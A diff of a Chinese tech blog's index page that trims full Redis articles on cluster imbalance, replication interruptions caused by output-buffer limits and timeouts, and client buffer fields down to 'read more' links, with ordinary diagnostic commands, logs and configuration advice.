-<h3 id="确认是否因monitor命令引起的输出缓冲区占用内存过大的问题"><a href="#确认是否因monitor命令引起的输出缓冲区占用内存过大的问题" class="headerlink" title="确认是否因monitor命令引起的输出缓冲区占用内存过大的问题"></a>确认是否因monitor命令引起的输出缓冲区占用内存过大的问题</h3><p>这类情况基本Redis实例内存会快速增长，很快会出现回落。通过监测client输出缓冲区使用情况</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">2.5.1 通过监控client_longest_output_list输出列表的长度，是否有client使用大量的输出缓冲区.</div><div class="line">redis-cli  -p 7000 info clients</div><div class="line"># Clients</div><div class="line">connected_clients:52</div><div class="line">client_longest_output_list:9179</div><div class="line">client_biggest_input_buf:0</div><div class="line">blocked_clients:0</div><div class="line"></div><div class="line">2.5.2 查看输出缓冲区列表长度不为0的client。 可见monitor占用输出缓冲区370MB</div><div class="line">redis-cli  -p 7000 client list | grep -v &quot;oll=0&quot;</div><div class="line">id=1840 addr=xx64598  age=75 idle=0 flags=O obl=0 oll=15234 omem=374930608 cmd=monitor</div></pre></td></tr></table></figure>
-<h2 id="如何有效避免Redis集群“倾斜”问题"><a href="#如何有效避免Redis集群“倾斜”问题" class="headerlink" title="如何有效避免Redis集群“倾斜”问题"></a>如何有效避免Redis集群“倾斜”问题</h2><ul>
-<li>集群部署和扩容处理，保证数据槽位分配平均</li>
-<li>keyspace设计时，如何避免热点key, 打散热key</li>
-<li>业务在键空间设计时，中尽量避免使用大的集合类型的Key，把key设计拆分</li>
-<li>程序角度尽量避免使用keys hash tag</li>
-<li>避免工程师直接使用keys,monitor等命令，导致输出缓冲区堆积.</li>
-<li>合量配置normal的client output buffer, 建议设置10mb(警示:和业务确认调整再修改，避免业务出错)</li>
-</ul>
-<p>在实际生产业务场景中，大规模集群很难做到集群的完全均衡，只是尽量保证不出现严重倾斜问题。</p>
-
-          
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/08/03/redis-cluster-imbalance/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -813,123 +688,13 @@
 
       
         
-          
-            <p>很多常见数据库(含NoSQL)都用复制技术的多机结构，以实现数据冗余、高可用、数据备份和多地域读取等；<br>如MySQL/MongoDB/Redis, 所以复制中断异常的Troubleshtooing和预案都是DBA们常常聊话题。<br>本文主要写Redis较常见的两种复制中断，以及导致反复无限次同步。</p>
+          <p>很多常见数据库(含NoSQL)都用复制技术的多机结构，以实现数据冗余、高可用、数据备份和多地域读取等；<br>如MySQL/MongoDB/Redis, 所以复制中断异常的Troubleshtooing和预案都是DBA们常常聊话题。<br>本文主要写Redis较常见的两种复制中断，以及导致反复无限次同步。</p>
 <hr>
-<h2 id="Redis复制中断的影响"><a href="#Redis复制中断的影响" class="headerlink" title="Redis复制中断的影响"></a>Redis复制中断的影响</h2><p>Redis复制中断后，Slave会立即发起psync,psync尝试部署同步不成功，就会全量同步RDB；这样对分布式Redis集群影响较大。</p>
-<ul>
-<li>复制中断，Redis集群当前分片存在单点故障风险，此间Master故障，无可用slave进行failover，当前分片将不可用。</li>
-<li>如果Redis全量同步，会导致Master执行bgsave,进程fork, 可造成master达到毫秒或秒级的卡顿。</li>
-<li>Redis进程Fork导致Copy-On-Write(下文简称COW)，最大能导致Master进程内存使用量的消耗。(eg RDB: 5213 MB of memory used by copy-on-write)</li>
-<li>Redis Slave load RDB过程，会导致复制线程的client output buffer增长很大；增大Master进程内存消耗</li>
-<li>Redis保存RDB(不考虑disless replication),导致服务器磁盘IO和CPU(压缩)资源消耗</li>
-<li>发送数GB大小的RDB文件,会导致服务器网络出口爆增，磁盘顺序IO吞吐量高，如果千兆网卡服务器，期间会影响业务正常请求响应时间(以及其他连锁影响)</li>
-</ul>
-<h2 id="Redis复制中断场景"><a href="#Redis复制中断场景" class="headerlink" title="Redis复制中断场景"></a>Redis复制中断场景</h2><p>导致Redis复制中断场景，常见以下两种情况(注:不包含网络等外部环境)</p>
-<ul>
-<li>Master端的Slave客户端输出缓冲，达到限制大小，被客户端强制Kill，导致复制中断</li>
-<li>Master和Slave之间复制超时repl-timeout断开，导致复制中断</li>
-</ul>
-<h3 id="Slave客户端的Client-output-buffer达到大小限制被Master强制Kill"><a href="#Slave客户端的Client-output-buffer达到大小限制被Master强制Kill" class="headerlink" title="Slave客户端的Client output buffer达到大小限制被Master强制Kill"></a>Slave客户端的Client output buffer达到大小限制被Master强制Kill</h3><p>为实时同步Master写入数据，Slave产生一个长连接到Master；当这个长连接被断开后，复制被中断。2.1小节深入讨论因输出缓冲区达到大小限制，复制连接被Master强行断开的理论分析、故障现象和规避措施.</p>
-<h4 id="输出缓冲区"><a href="#输出缓冲区" class="headerlink" title="输出缓冲区"></a>输出缓冲区</h4><p> Redis每个客户端都两个输出输出缓冲区(client output buffer),运行命令的返回结果，会放入到缓冲区中。</p>
-<ul>
-<li>静态定长16KB的缓存区；主要快速存储返回比较小的结果；如简单的get等</li>
-<li>动态大小缓冲区；存储返回较大的结果，如大的集合类型:set/list/hash<br>————– 关于客户端的输出缓存区，可见《Redis Client query buffer and client output buffer》</li>
-</ul>
-<h4 id="client-output-buffer-limit"><a href="#client-output-buffer-limit" class="headerlink" title="client-output-buffer-limit"></a>client-output-buffer-limit</h4><p>  Redis为避免输出缓冲区过度耗用内存，使用client-output-buffer-limit参数限制客户端输出缓冲区内存使用量。<br>  关于Redis如何限制输出缓冲区限制，请参考官方<a href="http://redis.io/topics/clients" target="_blank" rel="external">文章</a>。<br>  Redis数据复制过程中，Slave有个flags=S的客户端连接到Master; 它和其他客户端一样有输出缓冲区和缓冲区大小限制。<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># 输出缓冲配置格式：client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;</div><div class="line">下面是Master上的slave客户端，默认缓冲区大小限制:当缓冲区使用超过256mb,Master会尽快杀掉它；</div><div class="line">当缓冲区使用大于64mb,且小于256mb的soft limit值时，并持续时间达60秒，也会被Master尽快杀掉。</div><div class="line">client-output-buffer-limit slave 256mb 64mb 60</div></pre></td></tr></table></figure></p>
-<p>关于如何查看，各个客户端的输出缓冲区使用情况，请见blog—有详细说明。</p>
-<h4 id="Master因slave-client输出缓冲区中断复制的现象"><a href="#Master因slave-client输出缓冲区中断复制的现象" class="headerlink" title="Master因slave client输出缓冲区中断复制的现象"></a>Master因slave client输出缓冲区中断复制的现象</h4><p>出现因slave client输出缓冲区达到限制，被Master强行断开。Master的日志中会显示以下内容。<br>可见Slave同步线程id=220(flags=S),输出缓冲区大小已使用256mb(omem=268436720),提示被Master断开；<br>另外Slave发现复制断开后，会马上发送psync进行同步，这时容易因buffer再失败，这样无限循环复制的情况就产生。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># Client id=220 addr=127.0.0.1:23972 age=1213 idle=0 flags=S db=0 qbuf=0 qbuf-free=0 obl=0 oll=9350 omem=268436720 events=rw cmd=replconf scheduled to be closed ASAP for overcoming of output buffer limits.</div><div class="line">[30042] 31 Jul 13:36:01.291 # Connection with slave 127.0.0.1:7001 lost.</div><div class="line">[30042] 31 Jul 13:36:01.548 * Slave asks for synchronization</div></pre></td></tr></table></figure></p>
-<h4 id="导致输出缓冲区达到限制的场景"><a href="#导致输出缓冲区达到限制的场景" class="headerlink" title="导致输出缓冲区达到限制的场景"></a>导致输出缓冲区达到限制的场景</h4><p>导致slave客户端输出缓冲达到限制的常见场景：</p>
-<ul>
-<li>Master写入的数据量过大(写入QPS*每个命令操作的key大小)，导致在Master端堆积，消耗同步线程的输出缓冲区。</li>
-<li>Slave重新全量同步，初始化过程中，Master写入命令是堆积在同步线程的输出缓冲区。</li>
-</ul>
-<p>第一种情况出现的情况较少，我们生产出现两次都是程序问题。通过测试，如果写入命令的流量在80MB+就比较危险，这时就会看到slave同步线程的输出缓冲区omem开始有增长。</p>
-<p>第二种情况出现机率较大，因Redis Slave向Master发起全量同步数据，这个过程拆分几个步骤，此期间Master的写入命令都存储在同步线程的输出缓冲区。<br>全量同步过程耗时简化为串行的4步：</p>
-<ul>
-<li>Master执行bgsave, fork子进程保存和压缩RDB文件；耗时T1.</li>
-<li>Master把RDB文件发送给Slave过程；耗时T2.</li>
-<li>Slave flush自己的数据；耗时T3.</li>
-<li>Slave Load RDB ;  耗时T4.</li>
-</ul>
-<p>全量同步过程总耗时T=(T1+T2+T3+T4)之和，这4步耗时量增大，那么Master端写入命令堆积到缓冲区的数据量就增大，一旦达到限制的条件，Master就断开同步线程。下面Master日志就显示全量同步过程中的断开情况，注意：cmd=psync和前文2.1.3节中的cmd=replconf是不同的。 psync表示中全量同步时期间导致中断(第二种情况)，replconf表示正常过程中被中断（第一种情况). 下节讨论如何处理这种情况。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># Client id=809 addr=127.0.0.1:44100  age=2 idle=2 flags=S  qbuf=0 qbuf-free=0 obl=14717 oll=13082 omem=268442640 events=r cmd=psync scheduled to be closed ASAP for overcoming of output buffer limits.</div><div class="line">[25666] 01 Aug 20:31:39.226 # Connection with slave 127.0.0.1:7001 lost.</div></pre></td></tr></table></figure></p>
-<h4 id="因输出缓冲区导致复制中断故障处理"><a href="#因输出缓冲区导致复制中断故障处理" class="headerlink" title="因输出缓冲区导致复制中断故障处理"></a>因输出缓冲区导致复制中断故障处理</h4><p>DBA收到复制中断告警，</p>
-<ul>
-<li><p>第一步：通过查看Master的日志，追查这次复制中断故障的第一条日志，如果见到前文2.1.3节点的错误日志，基本能确认Master写入数据量过大导致。<br>一般通过其他监控告警项再确认，Redis的写入数据指标：total_net_input_bytes，服务器的网络入口流量。</p>
-</li>
-<li><p>第二步：如果确认原因，建议马上中止slave的反复同步(这里会出现2.1.4中第二种情况)，一般通过暂时关闭从库方式。</p>
-</li>
-<li><p>第三步：快速定位是哪类KEY写入流量最大；使用工具<a href="https://github.com/hirose31/redis-traffic-stats" target="_blank" rel="external">redis-traffic-stats</a>分析top traffic的key和commands. 通过分析定位是set ad:1000:xxxx这个大key(7.3MB)导致的；然后通知负责这个key前缀的业务工程师，<br>通知停止服务或回滚上线等。这里也可用<a href="https://github.com/facebookarchive/redis-faina" target="_blank" rel="external">facebook redis-faina</a>，它时基于monitor命令；部署简单，但定位traffic问题没这么直观。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">## Command Detail</div><div class="line">### SET</div><div class="line">Key                                                        | Bytes     | Byte/sec     | Count  | Pct    | Req/sec</div><div class="line">-----------------------------------------------------------|----------:|-------------:|-------:|-------:|---------:</div><div class="line">ad:1000:xxxx                                     | 156416272 |  52138757.33 |     23 |   0.20 |     7.67</div><div class="line">ad:10001:xxxx                  |    114804 |     38268.00 |    149 |   1.31 |    49.67</div></pre></td></tr></table></figure>
-</li>
-<li><p>第四步：业务fix问题后；准备恢复主从同步复制；这时就有第二种情况，因同步4个时间段; 这时DBA需临时对调大<br>client-output-buffer-limit的slave limit到数GB; 同时mv掉从库RDB/AOF文件让Slave以空实例启动(避免T3时间消耗)；监控Master的同步线程(flags=S)的omem值的增长情况，通过微调直到复制正常同步。</p>
-</li>
-<li>第五步：故障完全解决；然后组织postmortem会议分析故障和action plan.</li>
-</ul>
-<p>从这个故障案例中，DBA进一步工作：</p>
-<ul>
-<li>[monitor]如果监测缓冲区、Redis进程网络IO等，故障前发现异常行为</li>
-<li>[proxy]redis的自我保护或过载保护机制弱；我们需要一个proxy来完成类似功能，如过1mb的key就丢弃</li>
-<li>[platform]我们需要一个平台，准实时采样监测Redis实例级的top commands, top hot key, top traffic等</li>
-</ul>
-<h3 id="Master-Slave因复制超时，导致复制中断"><a href="#Master-Slave因复制超时，导致复制中断" class="headerlink" title="Master-Slave因复制超时，导致复制中断"></a>Master-Slave因复制超时，导致复制中断</h3><p>Redis复制中，Master和Slave彼此间都有心跳检测，如果检测超过repl-timeout秒(默认60)，就会认为超时，并强行断开复制， Slave感知断开后，会重新发起psync。</p>
-<h4 id="Master与Slave间的心跳检测"><a href="#Master与Slave间的心跳检测" class="headerlink" title="Master与Slave间的心跳检测"></a>Master与Slave间的心跳检测</h4><p>那么Redis Master和slave是怎么做心跳检查的</p>
-<ul>
-<li>Master每隔10秒(repl-ping-slave-period参数配置)向Slave发送PING命令</li>
-<li>Slave每隔1秒向Master发送”REPLCONF” “ACK” “数字(slave_repl_offset)”</li>
-</ul>
-<p>Master发送给Slave的PING命令，在Slave端使用Monitor命令查看如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1470062065.418475 [0 127.0.0.1:7000] &quot;PING&quot;</div><div class="line">1470062075.431501 [0 127.0.0.1:7000] &quot;PING&quot;</div></pre></td></tr></table></figure></p>
-<p>Slave发送Master的REPLCONF命令,在Master端使用Monitor命令查看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1470062074.229797 [0 127.0.0.1:44105] &quot;REPLCONF&quot; &quot;ACK&quot; &quot;137158669602&quot;</div><div class="line">1470062075.231199 [0 127.0.0.1:44105] &quot;REPLCONF&quot; &quot;ACK&quot; &quot;137158669602&quot;</div><div class="line">1470062076.232647 [0 127.0.0.1:44105] &quot;REPLCONF&quot; &quot;ACK&quot; &quot;137158669616&quot;</div></pre></td></tr></table></figure></p>
-<h4 id="Redis判断复制超时的3个角度"><a href="#Redis判断复制超时的3个角度" class="headerlink" title="Redis判断复制超时的3个角度"></a>Redis判断复制超时的3个角度</h4><p>Redis从3个角度判断复制超时，任何一个出现都将导致复制超时中断。</p>
-<ul>
-<li>第一种 从Master端角度看: 在repl-timeout秒内未收到Slave的REPLCONF ACK pings指令，Maste认为超时并强制断开复制(可通过Master中info Replication中lag=x，x表示Slave最近一次上报间隔秒数)</li>
-<li>第二种 从Slave端角度看: repl-timeout秒内未收到Master的数据或PING命令，Slave认为超时并强制断开复制，并立即发送重新同步，反复尝试，直接到同步成功。(可通过Slave中info Replication的 master_last_io_seconds_ago指标，表示主库最近发送数据的间隔秒数)</li>
-<li>第三种 从Slave端角度看：复制同步时，Slave发送psync等待Master发送RDB文件，如果repl-timeout秒内未收到RDB文件，Slave认为Master持久化异常，断开复制。</li>
-</ul>
-<p>第一种超时， Master的日志中出现内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[29129] 29 Jul 03:16:05.910 # Disconnecting timedout slave: 127.0.0.1:7001</div><div class="line">[29129] 29 Jul 03:16:05.910 # Connection with slave 127.0.0.1:7001 lost.</div><div class="line">[29129] 29 Jul 03:16:06.148 * Slave asks for synchronization</div></pre></td></tr></table></figure></p>
-<p>另外如果有监控lag指标，lag正常是1和0之间波动；如果lag出现在较大，可发送告警，说明Slave未及时发送replconf指令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$info replication</div><div class="line"># Replication</div><div class="line">role:master</div><div class="line">connected_slaves:1</div><div class="line">slave0:ip=127.0.0.1,port=7001,state=online,offset=3535,lag=50</div><div class="line">master_repl_offset:35374</div></pre></td></tr></table></figure></p>
-<p>第二种超时，Slave日志中出现内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[30100] 29 Jul 03:34:24.625 # MASTER timeout: no data nor PING received...</div><div class="line">[30100] 29 Jul 03:34:24.625 # Connection with master lost.</div><div class="line">[30100] 29 Jul 03:34:24.625 * Caching the disconnected master state.</div><div class="line">[30100] 29 Jul 03:34:24.625 * Connecting to MASTER 127.0.0.1:7000</div><div class="line">[30100] 29 Jul 03:34:24.625 * MASTER &lt;-&gt; SLAVE sync started</div></pre></td></tr></table></figure></p>
-<p>另外如果有监控master_last_io_seconds_ago指标，表示离上次Master发送数据或PING命令到Slave时间<br>一般大于10秒就建议告警。</p>
-<p>第三种超时，比较难复现，查看源码可见，Slave日志以下内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Timeout receiving bulk data from MASTER... If the problem persists try to set the &apos;repl-timeout&apos; parameter in redis.conf to a larger value.&quot;</div></pre></td></tr></table></figure></p>
-<h4 id="导致复制超时的场景"><a href="#导致复制超时的场景" class="headerlink" title="导致复制超时的场景"></a>导致复制超时的场景</h4><p>从前面2节中，我们已分析Redis心跳检测机制和复制超时判断的3个角度；现在很容易指明导致复制超时的场景</p>
-<ul>
-<li>Master执行大命令，运行阻塞超过repl-timeout秒，未向Slave发送任何写数据和PING; 导致Slave中断复制。</li>
-<li>Slave执行大命令，运行阻塞超过repl-timeout秒,未向Master上报”REPLCONF” “ACK”；导致Master中断复制。</li>
-<li>Master bgsave生成RDB失败或过慢；从2.8/3.x版本这个过程只包含前文2.1.3中的T1耗时的一部分；所以在新版本中这类超时很难出现了。</li>
-</ul>
-<h4 id="复制超时的故障处理"><a href="#复制超时的故障处理" class="headerlink" title="复制超时的故障处理"></a>复制超时的故障处理</h4><p>复制超时中断一般会接收以下告警：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1 slave告警：master_link_status=0 复制中断</div><div class="line">2 master告警：slave-lag&gt;30 slave 30秒内未上报数据</div><div class="line">3 slave告警：master_last_io_seconds_ago&gt;30 master 30秒内未向slave发送数据或ping命令</div><div class="line">4 master/slave告警： slowlog_len 慢查询告警</div></pre></td></tr></table></figure></p>
-<p>处理流程</p>
-<ul>
-<li>第一步 确认导致超时的节点是Master或Slave?  通过2,3告警，以及登录两个实例slowlog get查看慢查询确认</li>
-<li>第二步 解决问题前，先停掉复制同步，避免无限重复同步，进一步影响业务性能</li>
-<li>第三步 第一步定位的有问题节点，通过slowlog get 分析查询耗时大于30~60秒的大操作，包含key等<br>并通过RD停掉相关操作</li>
-<li>第四步 确认问题节点，无这类慢查询后；恢复复制同步</li>
-<li>组织postmortem会议；分析如何避免这类问题？（见后文第4节）</li>
-</ul>
-<p>正常的Redis请求P99响应时间都是小于1ms的；但RD有时会手动执行O(n)的命令，比如keys hgetall类<br>如keys命令，生产都会rename掉。</p>
-<h2 id="无限次循环复制"><a href="#无限次循环复制" class="headerlink" title="无限次循环复制"></a>无限次循环复制</h2><p>Redis复制被中断后，Slave会不停地重新同步psync,直到同步成功。<br>过程：slave发送psync –&gt; master bgsave(2.1.4中的4个步骤) –&gt;复制因缓冲区限制中断（2.8版本后，重新同步基本不会出现超时断开）–&gt; slave立即又psync<br>因为每次同步的对Master的性能和资源影响都较大，所以生产出现反复同步后，需DBA立即介入处理。<br>在修复同步前，要先解决导致同步第一次中断的原因，最好解决后；再用以下方法恢复同步<br>处理流程：</p>
-<ul>
-<li>第1步 解决问题前，先停掉复制同步(slaveof no one， cluster需关闭slave)，避免无限重复同步，进一步影响业务性能</li>
-<li>第2步 分析Master日志，确认反复同步失败的原因:是输出缓冲区，还是repl-timeout</li>
-<li>第3步 如果超时导致先临时调大repl-timeout(如600秒)；如复制线程输出缓冲区导致：调大client-output-buffer-limit slave 的hardlimit， softlimit sec；<br>同步调大maxmemory避免缓冲区内存消耗内存后，引起缓存数据大量淘汰，引起缓存穿透。</li>
-<li>第4步 减少同步的耗时阶段-slave flush old data(flushall每秒处理数十万key): 关闭Slave，移走它的RDB和AOF文件，启动Slave空实例</li>
-<li>第5步 Master端查看复制线程输出缓冲区消耗情况，如果失败还需临时调大。 恢复后建议回调参数设置</li>
-</ul>
-<h2 id="怎么规避和提前发现复制同步异常"><a href="#怎么规避和提前发现复制同步异常" class="headerlink" title="怎么规避和提前发现复制同步异常"></a>怎么规避和提前发现复制同步异常</h2><p>已比较详细分析出现复制中断的原理和场景， 在生产大规模集群运营中，定制合理的规范和流程；</p>
-<ul>
-<li>设置合理的Redis配置参数</li>
-<li>靠谱的监控预警，提前发现隐患</li>
-<li>开发规范和写入容量规划</li>
-<li>过载保护的proxy或SDK</li>
-</ul>
-<h3 id="针对复制中断问题，设置合理的配置参数"><a href="#针对复制中断问题，设置合理的配置参数" class="headerlink" title="针对复制中断问题，设置合理的配置参数"></a>针对复制中断问题，设置合理的配置参数</h3><p>请根据各自的场景进行微调，这里只是把问题提出来，给定个参考值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">1 调大slave的输出缓冲区大小设置，尤其是&lt;soft limit&gt; &lt;soft seconds&gt;。 注意此设置每个Slave对应一个Slave输出缓冲区。</div><div class="line">  client-output-buffer-limit slave 1gb 256mb 600</div><div class="line">2 maxmemory需考虑输出缓冲区的消耗，尤其未设置淘汰，可能导致used_memory达到maxmemory写入失败</div><div class="line">3 数据非强一致场景,建议调大repl-timeout到70秒；因为监控数据采集周期为60秒，提高发现问题的机率</div><div class="line">4 调大复制积压缓冲大小设置repl-backlog-size默认1mb</div><div class="line"> repl-backlog-size是server共享的，建议大于100mb.  这样出现网络闪断，或超时复制中断时，Slave较大可能使用“部分同步”，减少全量同步的影响</div><div class="line">5 rename掉keys等复杂的O(n)命令，避免程序或RD手动执行，导致复制超时</div></pre></td></tr></table></figure></p>
-<h3 id="设置靠谱的监控预警，提前发现隐患"><a href="#设置靠谱的监控预警，提前发现隐患" class="headerlink" title="设置靠谱的监控预警，提前发现隐患"></a>设置靠谱的监控预警，提前发现隐患</h3><p>很多重大疾病，往往在爆发前很长段时间，身体就表现出各种“状况”；如果还不及时就医，就会”病入膏肓”，所以我们每年都要体检一到两次。<br>同理，Redis在出现复制中断前，往往Redis各项“身体指标”又表现不正常了，作为医生的你，是否能及时发现和医治。<br>谈谈Redis的哪些指标异样时，会告诉我们可能中断。关于Redis监控告警，另外写文说明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">1 Redis进程写入流量异常，写入的数据都会转为Redis的[协议RESP](http://redis.io/topics/protocol)同步到从库，通过测试基本每秒写入IO在80MB</div><div class="line">复制因slave同步线程缓冲区达到限制，被Master中断。那我们如何监控Redis进程网络入口IO（2.8高版本中指标）</div><div class="line">total_net_input_bytes 每秒大于30MB就发起告警，如果是正常流量，建议扩容</div><div class="line"></div><div class="line">2 监控最大缓冲区队列长度，直观监控omem是否正常， 详细分析见（two buffer -------)</div><div class="line">client_longest_output_list 建议设置500~1000的告警阈值，这在侧面反馈输出缓冲区的内存大小，但不一定slave同步线程的</div><div class="line"></div><div class="line">3 Master端监控每个Slave的lag值,离最近一次上报数据的秒数，如果过长说明Slave网络断开，或已被大命令卡住了</div><div class="line">  slave_lag 建议10秒阈值</div><div class="line"></div><div class="line">4 Slave端监控Master的master_last_io_seconds_ago,离最近一次发送数据或ping的秒数。如果时间过长说明Master断开，或已被大命令卡住</div><div class="line">  master_last_io_seconds_ago 建议15秒阈值</div></pre></td></tr></table></figure></p>
-<h3 id="制定开发规范和合理容量规划"><a href="#制定开发规范和合理容量规划" class="headerlink" title="制定开发规范和合理容量规划"></a>制定开发规范和合理容量规划</h3><p>这里简单介绍避免复制中断的开发规范<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1 核心集群禁用1mb的String大key，减少操作频率高100KB的key; 集合类的KEY往往多，且不会覆盖全写.</div><div class="line">  如果1mb的key,每秒重复写入50次，就会导致写入网络IO达50MB; 生产大故障遇到一个15MB，以前是1分钟</div><div class="line">  入几次，业务端扩容服务器后1秒写入多次，直接导致复制中断。</div><div class="line">2 程序禁止对大集合类key,进行O(n)的访问模式；比如一个很多字段的hash, 一次hgetall.</div><div class="line">3 容量规划：根据监控容量指标，比较业务写入IO正常增长，应及时拆分扩容</div></pre></td></tr></table></figure></p>
-<h3 id="需proxy或SDK来做过载保护"><a href="#需proxy或SDK来做过载保护" class="headerlink" title="需proxy或SDK来做过载保护"></a>需proxy或SDK来做过载保护</h3><p>详细规范虽制定了，但往往有人故意或无意打破常规；作为后端存储，如果没有强制的自我保护措施，这样只能被FUCK！！！<br>如果因此出现故障，往往就有人吐槽Redis真不行，这种异常都处理不了！！<br>你的要求是：存储key在数10亿级，百万级QPS, P99 latency&lt;1ms, 绝对高可用，多IDC支持，网络分区，数据耐久性高，数据恢复的RPO/RTO……………<br>一不小心，又吐槽两句。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1 proxy强行过滤1mb的key操作</div><div class="line">2 proxy限流处理</div></pre></td></tr></table></figure>
-<p>[完]</p>
-
-          
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/07/31/redis-replication-broken-and-loopsync/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -1046,61 +811,13 @@
 
       
         
-          
-            <p>每个Redis客户端（以下简称”Client”)都有多个状态属性，而理解和分析这些属性，对于我们设计Redis键空间和运营管理都有帮助。<br>本文将详细分析Client的两个重要属性：Query buffer（输入缓冲区）、Output buffers（输出缓冲区）</p>
+          <p>每个Redis客户端（以下简称”Client”)都有多个状态属性，而理解和分析这些属性，对于我们设计Redis键空间和运营管理都有帮助。<br>本文将详细分析Client的两个重要属性：Query buffer（输入缓冲区）、Output buffers（输出缓冲区）</p>
 <hr>
-<h2 id="Redis-Client属性一览"><a href="#Redis-Client属性一览" class="headerlink" title="Redis Client属性一览"></a>Redis Client属性一览</h2><p>  使用<a href="http://redis.io/commands/client-list" target="_blank" rel="external">redis client</a>命令可查看当前Redis实例的所有客户端；每行数据对应一个客户端。<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">127.0.0.1:6390&gt; client list</div><div class="line">id=2 addr=127.0.0.1:53184 fd=8 name= age=33 idle=24 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=0 qbuf-free=0 obl=0 oll=0 omem=0 events=r cmd=client</div><div class="line">id=3 addr=127.0.0.1:53190 fd=7 name= age=2 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=0 qbuf-free=32768 obl=0 oll=0 omem=0 events=r cmd=client</div></pre></td></tr></table></figure></p>
-<p>以上为两个客户端，每个包含18个字段属性；其中属性的基本含义此处简单说明，后文会对重启指标深入分析。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">id：客户端唯一标识, 每新创建一个连接就自增1；redis重启后重置1。</div><div class="line">addr: 客户端源ip:port;用于分析异常的客户端，定位是由哪个服务器哪个进程引起的； 如id=2的客户端 netstat -anp | grep 53184</div><div class="line">fd: socket的文件描述符；数值同lsof的FD字段相同</div><div class="line">name: 客户端的名字，默认不会设置，一般用处不大。可手动执行[clientsetname](http://redis.io/commands/client-setname)</div><div class="line">age: 客户端存活的秒数</div><div class="line">idle: 空闲的秒数；用于回收客户端和分析大量连接时有用</div><div class="line">flages:客户端类型的标志, 共13种，常用的几种：N(普通客户端),M(master),S(slave),O(执行monitor)</div><div class="line">db:客户端当前使用的database序号</div><div class="line">sub/psub: 快订阅的频道/模式数</div><div class="line">multi:当前事务中已执行命令个数</div><div class="line">qbuf: query buffer的字节数         重要</div><div class="line">qbuf-free: query buffer的剩余字节数</div><div class="line">obl:定长Output buffer的使用字节数</div><div class="line">oll:可变大小output buffer的对象个数</div><div class="line">omem:可变大小output buffer的内存使用字节数  重要</div><div class="line">events: 文件描述符事作件(r/w)</div><div class="line">cmd:客户端最近一次执行的命令，不包含参数</div></pre></td></tr></table></figure></p>
-<h2 id="Redis-Client-Query-Buffer"><a href="#Redis-Client-Query-Buffer" class="headerlink" title="Redis Client Query Buffer"></a>Redis Client Query Buffer</h2><p>每个Client都有一个query buffer(查询缓存区或输入缓存区), 它用于保存客户端的发送命令，redis server从query buffer获取命令并执行。</p>
